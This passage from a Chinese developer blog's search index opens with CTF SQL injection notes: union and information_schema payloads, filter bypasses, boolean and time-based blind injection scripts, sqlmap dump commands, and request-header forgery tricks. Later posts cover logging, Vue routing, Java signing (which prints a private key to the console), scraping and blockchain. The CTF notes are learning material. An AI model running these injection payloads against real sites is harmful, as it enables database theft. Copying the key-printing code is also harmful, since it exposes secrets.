通过单引号 &#39; 判断是否有注入点 注入点多试以下符号： &#39; &quot; ) &#39;) 2.注入点是字符型还是数字型？ id=1 and 1=1和id=1 and 1=2 页面无变化，说明注入点不是整形；如果注入点为整形，则直接加入 sql 注入语句即可 id =1 &#39; and 1=1 %23, id =1 &#39; and 1=2 %23，说明注入类型为字符 3.判断输出内容有多少列判断字段数 id=&#39;order by 5 -- -&#39;, 如果字段为 5 则输出正常，输入order by 6%23 发现页面错误，说明没有 6 列，输入 5 正确，说明有5 列。 4.判断显示位查看页面显示的字段是第几位，id=&#39;union select 1,2,3,4,5 %23，查看显示数字是第几位 5.获取所有数据库名1id=&#x27;union select 1,2,select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA,4,5%23 得到两个数据库 information_schema, sq01 6.获取表名1id=&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;SQL01&#x27;),3%23 得到表名 users 7.获取列名1?id=&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3,4,5%23 8.然后根据表名和列名查询想要的数据9.sql关键字被过滤的解决方法 通过将关键字重复写两遍，如select 换为 seselectlect # 被注释 换成 -- -&#39; &#39; 被过滤，换成 %df\\:表示中文字符，%df 表示 ‘运，或者尝试 %df 然后再加 &#39; 布尔盲注当注入点没有提示信息返回，只有and 1&#x3D;1 或者 1&#x3D;2不相同提示时，可通过布尔盲注。通过撞字符获取数据库中的 flag。 12345678910111213141516import requestsurl = &quot;http://url/index.php?id=1&#x27;&quot;chars = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890!@#$%^&amp;*()&#123;&#125;&quot;flag = &quot;&quot;for i in range(1, 60): if &quot;&#125;&quot; in flag: break for char in chars: payload = url + &quot;and hex(mid((select flag from users),&#123;0&#125;,1))=hex(&#x27;&#123;1&#125;&#x27;) -- -&quot;.format(i, char) rsp = requests.get(payload) if &quot;SangFor&quot; in rsp.text: flag = flag + char print(flag) break 时间盲注时间盲注，当注入点没有其他提示信息返回时，通过布尔盲注也没有信息提示时，但是 and sleep(5) 页面有等待，说明存在时间盲注。 1234567891011121314151617import requestsurl = &quot;http://url/index.php?id=&quot;chars = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890!@#$%^&amp;*()&#123;&#125;&quot;flag = &quot;&quot;for i in range(1, 60): if &quot;&#125;&quot; in flag: break for char in chars: try: payload = url + &quot;1&#x27; and if(hex(mid((select flag from users),&#123;0&#125;,1))=hex(&#x27;&#123;1&#125;&#x27;),sleep(3),3) -- -&quot;.format(i, char) rsp = requests.get(payload, timeout=2) except: flag += char print(flag) break 通过 sqlmap 工具查询关键信息 查询数据库，pyhton2 sqlmap.py -u url --dbs 查询表 python2 sqlmap.py -u url -D 数据库名 --tables 查询字段 python2 sqlmap.py -u url -D 数据库名 -T 数据表名 --columns 查询值 python2 sqlmap.py -u url -D 数据库名 -T 数据表名 --dump 绕过字符过滤 python2 sqlmap.py -u url --dbs -t 10 --tamper unmagicquotes.py sqlmap","categories":[],"tags":[],"author":"Elijah Zheng"},{"title":"CTF - 信息收集基础","slug":"CTF-信息收集基础","date":"2021-07-20T07:02:00.000Z","updated":"2023-11-17T14:27:30.001Z","comments":true,"path":"2021/07/20/CTF-信息收集基础/","link":"","permalink":"https://blog.zhengxiangling.com/2021/07/20/CTF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80/","excerpt":"CTF，即夺旗赛，在网络攻防比赛中通过各种方式找到题目中的flag得到分数的一种比赛。","text":"CTF，即夺旗赛，在网络攻防比赛中通过各种方式找到题目中的flag得到分数的一种比赛。 查看源码搜索flagf12查看网页源码，通过源码搜索关键词查看是否有flag 通过备份文件找，或者网页源代码查看信息。如系统内的备份文件 web.rar 获取到应用源码，或者 php 的备份文件。 vim 的备份文件 nginx.conf.swp， php 常见的备份文件 index.php index.php~ .index.php.swp 使用文件扫描工具御剑后台扫描工具：输入要扫描的网址，一般选择 dir 和 php，但是这种扫描对域名不区分大小写。 dirsearch 命令行式扫描工具 python dirsearch.py -u ip地址 -e php。 如果遍历到了目录文件，可以继续遍历对应目录的所有文件。 如果目录遍历没有东西，可以考虑抓包分析报文。 抓包 burpsuit通过抓包，分析报文内的信息，有可能 flag 隐藏在 header 的 cookies、session或者 data内，如果有flag相关的明文、base64编码、md5值等，都可以作为待分析的为flag的地方。 base64 编码，编码最后的字符有双等号 &#x3D;&#x3D;。 md5 破解常用的网址 somd5.com。md5 破解不了，只能走代码审计，找数据库的password 提交请求 ip 伪造：x-forwarded-for: 127.0.0.1。 报文伪造域名来源 Referer：域名 url。 伪造 Cookie，报文 Cookie: isadmin=1","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.zhengxiangling.com/categories/CTF/"}],"tags":[],"author":"Elijah Zheng"},{"title":"SpringBoot 使用org.slf4j.Logger 记录日志","slug":"SpringBoot-使用org-slf4j-Logger记录日志","date":"2020-09-30T10:13:00.000Z","updated":"2023-11-17T14:27:30.003Z","comments":true,"path":"2020/09/30/SpringBoot-使用org-slf4j-Logger记录日志/","link":"","permalink":"https://blog.zhengxiangling.com/2020/09/30/SpringBoot-%E4%BD%BF%E7%94%A8org-slf4j-Logger%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97/","excerpt":"","text":"我们在本地运行应用程序时，可以通过控制台查看程序运行情况。但我们把应用部署到生产服务器时，或者对应用测试时需要查看程序运行的情况，我们可以把运行的情况记录到日志中，这样我们就可以通过日志查询程序运行的好坏情况，以及方便后续程序出错时找出错误点及时修复。 以下是在springboot通过org.slf4j.Logger记录日志,slf4j是springboot默认自带的日志框架，所以不需要在pom文件中引入。 定义配置 首先需要定义日志的配置文件，配置日志的等级、输出格式、输出位置、保存时间、保存大小等。 配置文件可以定义在项目路径/src/main/resources/logback.xml 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!-- 日志级别从低到高分为TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL，如果设置为WARN，则低于WARN的信息都不会输出 --&gt;&lt;!-- scan:当此属性设置为true时，配置文档如果发生改变，将会被重新加载，默认值为true --&gt;&lt;!-- scanPeriod:设置监测配置文档是否有修改的时间间隔，如果没有给出时间单位，默认单位是毫秒。 当scan为true时，此属性生效。默认的时间间隔为1分钟。 --&gt;&lt;!-- debug:当此属性设置为true时，将打印出logback内部日志信息，实时查看logback运行状态。默认值为false。 --&gt;&lt;configuration debug=&quot;false&quot; scan=&quot;true&quot; scanPeriod=&quot;30 seconds&quot;&gt; &lt;!-- 输出到控制台的配置--&gt; &lt;appender name=&quot;console_logger&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt; &lt;encoder class=&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;&gt; &lt;pattern&gt;%date [%level] [%thread] %logger&#123;80&#125; [%file : %line] %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;!--日志不会记录比INFO小的日志，TRACE、DEBUG、INFO、WARN、ERROR--&gt; &lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt; &lt;level&gt;INFO&lt;/level&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!--输出到日志文件--&gt; &lt;appender name=&quot;project_logger&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt; &lt;encoder&gt; &lt;pattern&gt;%date [%level] [%thread] %logger&#123;26&#125; [%file : %line] %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;!--日志不会记录比INFO小的日志，TRACE、DEBUG、INFO、WARN、ERROR--&gt; &lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt; &lt;level&gt;INFO&lt;/level&gt; &lt;/filter&gt; &lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt; &lt;fileNamePattern&gt;project-logs/project-log.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;totalSizeCap&gt;1GB&lt;/totalSizeCap&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;root level=&quot;INFO&quot;&gt; &lt;appender-ref ref=&quot;console_logger&quot;/&gt; &lt;appender-ref ref=&quot;project_logger&quot;/&gt; &lt;/root&gt;&lt;/configuration&gt; 开始使用定义好配置之后，我们就可以使用了，通过引入和在需要记录的地方使用即可。 需要注意的地方时，我们在上面配置信息里，定义了记录日志的等级为&lt;level&gt;INFO&lt;/level&gt;，意思是低于INFO等级的记录我们不会记录。 12345678910// 引入import org.slf4j.Logger;import org.slf4j.LoggerFactory;// 定义全局日志变量private static Logger logger = LoggerFactory.getLogger(ILogService.class);// 将信息记录到日志中String info = &quot;记录日志信息&quot;;logger.info(info); 然后info的信息，可以在日志文件.log中查看了。","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://blog.zhengxiangling.com/tags/java/"},{"name":"springboot","slug":"springboot","permalink":"https://blog.zhengxiangling.com/tags/springboot/"}],"author":"Elijah Zheng"},{"title":"vue-router 拦截用户页面路由访问","slug":"vue-router-拦截用户页面路由访问","date":"2020-08-15T11:05:00.000Z","updated":"2023-11-17T14:27:30.007Z","comments":true,"path":"2020/08/15/vue-router-拦截用户页面路由访问/","link":"","permalink":"https://blog.zhengxiangling.com/2020/08/15/vue-router-%E6%8B%A6%E6%88%AA%E7%94%A8%E6%88%B7%E9%A1%B5%E9%9D%A2%E8%B7%AF%E7%94%B1%E8%AE%BF%E9%97%AE/","excerpt":"","text":"在对需要做登录的系统前端页面访问做控制时，可以用router的beforeEach方式来对跳转到的路径做管理。如果访问的路径在路径白名单内，则可以继续访问，如果不在，则判断用户是否登录，如果未登录，则被强制跳转到登录页面。 一般在前端，用户登录完成之后，我们会将管理用户状态的token值存在Cookie或者session中，所以可以用是否有token值来判断用户是否已经做了登录。 权限判断逻辑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// permission.js// 引入 routerimport router from &#x27;./router&#x27;// 引入用户状态管理用的 storeimport store from &#x27;./store&#x27;// 引入 Cookies 插件import Cookies from &#x27;js-cookie&#x27;// 路由白名单，访问白名单页面不需要做登录const whiteList = [&#x27;/login&#x27;]router.beforeEach(async(to, from, next) =&gt; &#123; // 获取系统用户 Token，存的 Cookie 名由自己定 const hasToken = Cookies.get(&#x27;MySystemToken&#x27;) // 判断是否已经登录 if (hasToken) &#123; if (to.path === &#x27;/login&#x27;) &#123; // 如果已经是登录状态，访问登录页面，则强制跳转到主页 next(&#123; path: &#x27;/&#x27;&#125;) &#125; else &#123; // 判断 store 里是否已经已经有信息，如果没有则需要调接口获取 const hasGetUserInfo = store.getters.name if (hasGetUserInfo) &#123; // 有了信息的话，正常执行 next() &#125; else &#123; // 如果 store 没有信息，则调接口获取 try &#123; // 调用 store 里面定义的 user/getInfo 方法获取 user 信息 await store.dispatch(&#x27;user/getInfo&#x27;) next() &#125; catch (error) &#123; // 如果获取用户状态失败，一般是指 token 已获取或者错误，则清除 token，跳转到登录页重新登录 await store.dispatch(&#x27;user/resetToken&#x27;) console.log(error) next(`/login?redirect=$&#123;to.path&#125;`) &#125; &#125; &#125; &#125; else &#123; // 如果在白名单页面，则继续；否则跳转到登录页面 if (whiteList.indexOf(to.path) != -1) &#123; next() &#125; else &#123; next(`/login?redirect=$&#123;to.path&#125;`) &#125; &#125;&#125;) 写完权限判断逻辑，只需在vue框架入口的main.js中引入即可， 1234// main.jsimport ./permission","categories":[{"name":"Vue","slug":"Vue","permalink":"https://blog.zhengxiangling.com/categories/Vue/"}],"tags":[{"name":"vue-router","slug":"vue-router","permalink":"https://blog.zhengxiangling.com/tags/vue-router/"},{"name":"vue","slug":"vue","permalink":"https://blog.zhengxiangling.com/tags/vue/"}],"author":"Elijah Zheng"},{"title":"Java 读取公钥、私钥，SHA256算法加签、验签","slug":"Java-读取公钥、私钥，加签、验签","date":"2019-12-05T07:27:00.000Z","updated":"2023-11-17T14:27:30.002Z","comments":true,"path":"2019/12/05/Java-读取公钥、私钥，加签、验签/","link":"","permalink":"https://blog.zhengxiangling.com/2019/12/05/Java-%E8%AF%BB%E5%8F%96%E5%85%AC%E9%92%A5%E3%80%81%E7%A7%81%E9%92%A5%EF%BC%8C%E5%8A%A0%E7%AD%BE%E3%80%81%E9%AA%8C%E7%AD%BE/","excerpt":"最近在做利用私钥加签，和对加签串利用公钥验签，作如下总结：","text":"最近在做利用私钥加签，和对加签串利用公钥验签，作如下总结： 读取公钥123456789101112131415161718public static PublicKey getPublicKey() &#123; try &#123; File file = new File(&quot;公钥 cer 路径&quot;); InputStream inStream = new FileInputStream(file); // 创建X509工厂类 CertificateFactory cf = CertificateFactory.getInstance(&quot;X.509&quot;); // 创建证书对象 X509Certificate cert = (X509Certificate) cf .generateCertificate(inStream); inStream.close(); PublicKey publicKey = cert.getPublicKey(); return publicKey; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null;&#125; 读取私钥123456789101112131415161718192021222324252627public static PrivateKey getPrivateKey() &#123; try &#123; String keyStorePath = &quot;私钥 pfx 地址&quot;; String password = &quot;密码&quot;; // 实例化密钥库，默认JKS类型 KeyStore ks = KeyStore.getInstance(&quot;PKCS12&quot;); // 获得密钥库文件流 FileInputStream is = new FileInputStream(keyStorePath); // 加载密钥库 ks.load(is, password.toCharArray()); // 关闭密钥库文件流 is.close(); //私钥 Enumeration aliases = ks.aliases(); String keyAlias = null; if (aliases.hasMoreElements())&#123; keyAlias = (String)aliases.nextElement(); System.out.println(&quot;p12&#x27;s alias-----&gt;&quot;+keyAlias); &#125; return (PrivateKey) ks.getKey(keyAlias, password.toCharArray()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null;&#125; 加签12345678910111213141516171819202122232425262728/*** 私钥加签* @param unsignstr 需要加签的拼接串* @return 加签串*/public static String GetSign(String unsignstr)&#123; String signature = null; byte[] signed = null; try &#123; PrivateKey privateKey = getPrivateKey(); String privateKeyValue = Base64.getEncoder().encodeToString(privateKey.getEncoded()); System.out.println(&quot;私钥-------------&gt;&quot; + privateKeyValue); Signature Sign = Signature.getInstance(SIGNATURE_ALGORITHM); Sign.initSign(privateKey); System.out.println(unsignstr); byte[] outputDigest_sign = unsignstr.getBytes(); Sign.update(outputDigest_sign); signed = Sign.sign(); signature = Base64.getEncoder().encodeToString(signed); logger.info(signature); System.out.println(signature); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return signature;&#125; 验签12345678910111213141516171819202122232425262728293031323334353637/*** 公钥验签* @param requsetBody 验签报文* @param signature 验签串*/public static void read_cer_and_verify_sign(String requsetBody, String signature) &#123; String filePath = &quot;公钥路径&quot;; X509Certificate cert = null; try &#123; CertificateFactory cf = CertificateFactory.getInstance(&quot;X.509&quot;); cert = (X509Certificate) cf .generateCertificate(new FileInputStream(new File(filePath))); PublicKey publicKey = cert.getPublicKey(); String publicKeyString = new String(Base64.getEncoder().encode(publicKey .getEncoded())); System.out.println(&quot;-----------------公钥--------------------&quot;); System.out.println(publicKeyString); System.out.println(&quot;-----------------公钥--------------------&quot;); Signature verifySign = Signature.getInstance(SIGNATURE_ALGORITHM); verifySign.initVerify(publicKey); // 用于验签的数据 System.out.println(&quot;requestBody is &quot; + requsetBody); verifySign.update(requsetBody.getBytes()); boolean flag = verifySign.verify(Base64.getDecoder().decode(signature)); System.out.println(&quot;verifySign is &quot; + flag); &#125; catch (InvalidKeyException e) &#123; e.printStackTrace(); &#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace(); &#125; catch (SignatureException e) &#123; e.printStackTrace(); &#125; catch (CertificateException e) &#123; e.printStackTrace(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"https://blog.zhengxiangling.com/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.zhengxiangling.com/tags/java/"}],"author":"Elijah Zheng"},{"title":"beautifulSoup爬取同步加载页面数据","slug":"beautifulSoup爬取同步加载页面数据","date":"2019-11-15T03:00:00.000Z","updated":"2023-11-17T14:27:30.004Z","comments":true,"path":"2019/11/15/beautifulSoup爬取同步加载页面数据/","link":"","permalink":"https://blog.zhengxiangling.com/2019/11/15/beautifulSoup%E7%88%AC%E5%8F%96%E5%90%8C%E6%AD%A5%E5%8A%A0%E8%BD%BD%E9%A1%B5%E9%9D%A2%E6%95%B0%E6%8D%AE/","excerpt":"beautifulSoup 可以很方便的获取 html 页面的标签节点，而且也很容易获取到标签的属性和文本内容。我们就运用 beautifulSoup 来爬取同步加载页面数据，然后我们将获取到的数据存入到 excel 中。","text":"beautifulSoup 可以很方便的获取 html 页面的标签节点，而且也很容易获取到标签的属性和文本内容。我们就运用 beautifulSoup 来爬取同步加载页面数据，然后我们将获取到的数据存入到 excel 中。 爬取同步加载页面数据我们这里爬取豆瓣电影Top 250 的数据做描述，request库请求页面，beautifulSoup用来获取页面节点，所使用到的库自行安装。 获取页面源码1234567891011from urllib import requestfrom chardet import detectfrom bs4 import BeautifulSoupdef get_soup(page_url): &quot;&quot;&quot;获取源码&quot;&quot;&quot; with request.urlopen(page_url) as fp: byt = fp.read() det = detect(byt) return BeautifulSoup(byt.decode(det[&#x27;encoding&#x27;]), &#x27;lxml&#x27;) page_url为页面地址，lxml为python库自行安装。 获取页面数据我们运用beautifulSoup来获取页面的数据，数据一般存放在页面的节点内容中（如：标题、价格、数量）和节点的属性中（图片链接），所以我们需要找到这些存放数据的相应节点。 我们需要从中找到一些规律，每部电影的数据都存放在一个li中，所有的li都存放在一个ol中，图片的链接在li的img标签的src属性中，其他的数据都放在带有class属性的span标签中。 1234567891011121314151617181920212223242526272829# 正则式import redef get_data(page): &quot;&quot;&quot; 获取数据 selelct 可以用css语法获取标签，find可以获取标签里的 attrs 属性值 &quot;&quot;&quot; data = [] ol = page.find(&#x27;ol&#x27;, attrs=&#123;&#x27;class&#x27;: &#x27;grid_view&#x27;&#125;) for li in ol.select(&#x27;li&#x27;): # 单元 tmp = [] # 多个 title titles = [] img_url = li.find(&#x27;img&#x27;).attrs[&#x27;src&#x27;].strip() tmp.append(img_url) for span in li.findAll(&#x27;span&#x27;, attrs=&#123;&quot;class&quot;: re.compile(&#x27;&#x27;)&#125;): if span.attrs[&#x27;class&#x27;][0] == &#x27;title&#x27;: titles.append(span.string.strip()) # 评价 if span.attrs[&#x27;class&#x27;][0] == &#x27;rating_num&#x27;: tmp.append(span.string.strip()) # 简评 if span.attrs[&#x27;class&#x27;][0] == &#x27;inq&#x27;: tmp.append(span.string.strip()) tmp.insert(0, titles) data.append(tmp) return data 获取下一页的数据我们先需要在页面中找到下一页数据请求的参数我们可以看到下一页的参数为?start=25&amp;filter=，所以获取到这个参数然后加入到之前的网址当中，获取到的数据就是下一页的数据了。 1234567def next_url(page): &quot;&quot;&quot;获取下一页链接后缀&quot;&quot;&quot; a = page.find(&#x27;a&#x27;, text=re.compile(&quot;^后页&quot;)) if a: return a.attrs[&#x27;href&#x27;] else: return None 保存数据到 excel 中12345678910import xlwtdef xls_save(workbook, data, count): &quot;&quot;&quot;保存数据到excel&quot;&quot;&quot; for d in data: for i in range(len(d)): # print(d[i]) workbook.write(count, i, d[i]) count = count + 1 return workbook, count xlwt为python库自行安装，workbook为要保存的excel对象，data为beautifulSoup对象，count为要写入数据的行数。 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# 爬取豆瓣电影 top250from urllib import requestfrom chardet import detectfrom bs4 import BeautifulSoupimport reimport xlwtimport osdef get_soup(page_url): &quot;&quot;&quot;获取源码&quot;&quot;&quot; with request.urlopen(page_url) as fp: byt = fp.read() det = detect(byt) return BeautifulSoup(byt.decode(det[&#x27;encoding&#x27;]), &#x27;lxml&#x27;)def get_data(page): &quot;&quot;&quot; 获取数据 selelct 可以用css语法获取标签，find可以获取标签里的 attrs 属性值 &quot;&quot;&quot; data = [] ol = page.find(&#x27;ol&#x27;, attrs=&#123;&#x27;class&#x27;: &#x27;grid_view&#x27;&#125;) for li in ol.select(&#x27;li&#x27;): # 单元 tmp = [] # 多个 title titles = [] img_url = li.find(&#x27;img&#x27;).attrs[&#x27;src&#x27;].strip() tmp.append(img_url) for span in li.findAll(&#x27;span&#x27;, attrs=&#123;&quot;class&quot;: re.compile(&#x27;&#x27;)&#125;): if span.attrs[&#x27;class&#x27;][0] == &#x27;title&#x27;: titles.append(span.string.strip()) if span.attrs[&#x27;class&#x27;][0] == &#x27;rating_num&#x27;: tmp.append(span.string.strip()) if span.attrs[&#x27;class&#x27;][0] == &#x27;inq&#x27;: tmp.append(span.string.strip()) tmp.insert(0, titles) data.append(tmp) return datadef next_url(page): &quot;&quot;&quot;获取下一页链接后缀&quot;&quot;&quot; a = page.find(&#x27;a&#x27;, text=re.compile(&quot;^后页&quot;)) if a: return a.attrs[&#x27;href&#x27;] else: return Nonedef xls_save(workbook, data, count): &quot;&quot;&quot;保存数据到excel&quot;&quot;&quot; for d in data: for i in range(len(d)): # print(d[i]) workbook.write(count, i, d[i]) count = count + 1 return workbook, countif __name__ == &#x27;__main__&#x27;: url = &#x27;https://movie.douban.com/top250&#x27; soup = get_soup(url) # print(get_data(soup)) path = os.path.join(os.getcwd() + &quot;\\\\&quot; + &quot;douban-top250.xls&quot;) xls_file = os.path.exists(path) if xls_file: os.remove(path) wb = xlwt.Workbook(encoding=&#x27;utf-8&#x27;) xls = wb.add_sheet(&#x27;top250&#x27;) head = [&#x27;标题&#x27;, &#x27;图片地址&#x27;, &#x27;评分&#x27;, &#x27;简评&#x27;] # 表头 row = 1 for h in range(len(head)): xls.write(0, h, head[h]) xls, row = xls_save(xls, get_data(soup), 1) nxt = next_url(soup) while nxt: soup = get_soup(url + nxt) xls, row = xls_save(xls, get_data(soup), row) nxt = next_url(soup) wb.save(&#x27;douban-top250.xls&#x27;)","categories":[{"name":"爬虫","slug":"爬虫","permalink":"https://blog.zhengxiangling.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"beautifulSoup","slug":"beautifulSoup","permalink":"https://blog.zhengxiangling.com/tags/beautifulSoup/"},{"name":"python","slug":"python","permalink":"https://blog.zhengxiangling.com/tags/python/"}],"author":"Elijah Zheng"},{"title":"区块链技术及应用现状","slug":"区块链技术及应用现状-1","date":"2019-11-06T02:52:00.000Z","updated":"2023-11-17T14:27:30.009Z","comments":true,"path":"2019/11/06/区块链技术及应用现状-1/","link":"","permalink":"https://blog.zhengxiangling.com/2019/11/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%BA%94%E7%94%A8%E7%8E%B0%E7%8A%B6-1/","excerpt":"from 陈纯院士的讲座 区块链本质术语解释交易：交易指的是一次对账本的操作，如一笔转账交易。 区块：将一段时间内发生的所有交易和状态打包成为一个区块。 块链式数据结构（狭义区块链）：区块以时间顺序前后相连，组成一种块链式数据结构，及“区块链”一词的由来。 分布式账本（广义区块链）：多参与方各自部署，互联互通，构成分布式网络。","text":"from 陈纯院士的讲座 区块链本质术语解释交易：交易指的是一次对账本的操作，如一笔转账交易。 区块：将一段时间内发生的所有交易和状态打包成为一个区块。 块链式数据结构（狭义区块链）：区块以时间顺序前后相连，组成一种块链式数据结构，及“区块链”一词的由来。 分布式账本（广义区块链）：多参与方各自部署，互联互通，构成分布式网络。 三大支撑技术共识算法：针对区块链上发生的交易，保障区块链所有节点数据一致性。 块链式数据结构：将一段时间内的交易数据打包成区块，再将多个区块按时间顺序有序链接的一种数据结构，用来确保数据的不可篡改性。 智能合约：一段部署在区块链上可自动运行的程序，可以自动化地执行预先定义好的规则和条款，通过减少人为干预的风险，提升交易的安全与可信任度。 三种组织形态公有链：全球范围可以访问，不依赖于单个公司或辖区，匿名性强，任何参与者都可在中写入、读取、参与交易验证。 联盟链：联盟链仅限于联盟成员参与，系统内交易确认节点为事先设定，并通过共识机制确认。 私有链：仅在机构内使用，读写权、记账权由组织内自由定制。中心控制者制定可参与和进行交易验证成员范围。 共识算法BFT(拜占庭容错算法) 数学证明当且仅当三分之二以上的节点忠诚时，可以保证系统运行结果的正确性。 三大协议： 三阶段共识协议：保证了主节点打包的区块通过三阶段共识完成打包结果的一致性确认 视图变更协议：保证了在主节点作恶情况下，系统可以通过该协议选举出新任的主节点进行共识，且不破坏其原有的共识状态 检查点机制：保证了各节点经过确认的一致性状态得以持久化 行业分类币&#x2F;模式：比特币 天秤币 Libra（Facebook发行） 摩根币 JPM（摩根大通发行） 链&#x2F;技术：公有链 联盟链 顶层设计中共中央政治局10月24日下午就区块链技术发展现状和趋势进行第十八次集体学习。中共中央总书记习近平在主持学习时强调，区块链技术的集成应用在新的技术革新和产业变革中起着重要作用。我们要把区块链作为核心技术自主创新的重要突破口，明确主攻方向，加大投入力度，着力攻克一批关键核心技术，加快推动区块链技术和产业创新发展。 产业应用 要推动区块链和实体经济深度融合，解决中小企业贷款融资难、银行风控难、部门监管难等问题。 要利用区块链技术探索数字经济模式创新。 要探索“区块链+”在民生领域的运用，积极推动区块链技术在教育、就业、养老、精准脱贫、医疗健康、商品防伪、食品安全、公益、社会救助等领域的应用，为人民群众提供更加智能、更加便捷、更加优质的公共服务。 要推动区块链底层技术服务和新型智慧城市建设相结合探索在信息基础设施、智慧交通、能源电力等领域的推广应用，提升城市管理的智能化、精准化水平。 要利用区块链技术促进城市间在信息、资金、人才、征信等方面更大规模的互联互通。 要探索利用区块链数据共享模式，实现政务数据跨部门、跨区域共同维护和利用，促进业务协同办理。 技术革新当下，各大互联网公司隐私泄露事件频出，一次次加深了公众对垄断性互联网公司的警惕，去中心化的区块链技术被认为是推倒垄断、走向平等的重要技术手段；利用区块链技术的链式存储结构，保证数据不可篡改，密码学保证用户隐私，共识算法保证数据权平等，区块链技术正在构建一个全新的分布式技术架构，成为新一代基础设施。 提升多中心协作效率 去中介，提升多方信任 打破数据孤岛，提升数据应用效率 数据不可篡改，可追溯，可审计 自动执行预设，提升约束力，减少摩擦 三个阶段可信计算与存储（数据可信）：数字存证 审计监管 数字化社会（资产可信）：资产数字化 数据资产化 分布式商业（合作可信）：多中心弱中介 激励生态化 案例1.业务协作：养老金托管 利用区块链统筹管理养老金业务信息，将养老金业务流程线上化，提升资金使用效率。 实现养老金业务信息在参与机构之间快速同步 提高业务处理流程的透明度，增加数据可信度 减少业务处理周期，提高养老金申购赎回频率，提升资金使用率 2.数字资产：信用保险 供应链企业通过信用险增信，使得信用风险得到更大范围的分散，满足企业低成本融资的诉求。 为中小企业增信，缓解融资困难 标准化企业信用，实现风险缓释 实现供应链金融体系的信用穿透 助力完善社会信用体系 3.存证溯源：可信存证 存证方通过区块链平台实现电子存证可信存储，任意相关方在线查阅验证。 多方协同，随时调用，实现方便、快捷的可信电子存证 存证电子化，节约纸张成本 电子存证灵活对接，便于业务拓展","categories":[{"name":"区块链","slug":"区块链","permalink":"https://blog.zhengxiangling.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"}],"tags":[{"name":"技术应用","slug":"技术应用","permalink":"https://blog.zhengxiangling.com/tags/%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8/"}],"author":"Elijah Zheng"},{"title":"macOS Mojave 安装双系统 bug 总结","slug":"macOS-Mojave安装双系统-bug-总结","date":"2019-03-23T01:24:00.000Z","updated":"2023-11-17T14:27:30.006Z","comments":true,"path":"2019/03/23/macOS-Mojave安装双系统-bug-总结/","link":"","permalink":"https://blog.zhengxiangling.com/2019/03/23/macOS-Mojave%E5%AE%89%E8%A3%85%E5%8F%8C%E7%B3%BB%E7%BB%9F-bug-%E6%80%BB%E7%BB%93/","excerpt":"","text":"在 mac 上装 windows10 双系统一般是由于 开发的需要，有些系统级的架构只支持windows，不适合在 mac 上开发。 运行的游戏只支持 windows，无法在 mac 上运行。 macOS Mojave 只支持安装 windows10，往下的版本不再支持。启动转移助理（BootCamp）的功能目前也限制于制作双系统和将双系统恢复为单一分区，取消了之前支持windows多版本和制作u盘启动盘的选项。不过目前仍可用代码来制作u盘启动盘。 在 mac 上用 windows10 u盘启动盘来安装双系统是行不通的，因为会导致缺少驱动而不能往下安装，所以就只能走启动转移助理这条路。 windows10 经常更新版本，导致 mac 使用启动转移助理安装双系统时会出现各种各样的问题。列举如下： 版本问题。用 macOS Mojave 10.14版本只能安装 windows10 4月版的，安装10月版的会出现错误。将macOS Mojave升级到 10.14.3版本解决版本问题。 外接设备导致无法安装 windows 的问题。当进入到 windows 安装界面时，必须把所有外接设备（鼠标、u盘等）全部拔出，不然会出现分区找不到的错误导致无法安装 windows。 一旦将 windows 安装完毕之后，分配的硬盘空间将无法调整，所以分磁盘空间的时候必须考虑清楚。 用 mac 上的磁盘工具直接将 windows 分区抹除再合并分区，可能会导致下次安装 windows 失败，所以要删掉之前安装好的 windows 的办法是用启动转移助理将 windows 合并成单一分区。","categories":[{"name":"系统","slug":"系统","permalink":"https://blog.zhengxiangling.com/categories/%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"macOS","slug":"macOS","permalink":"https://blog.zhengxiangling.com/tags/macOS/"}],"author":"Elijah 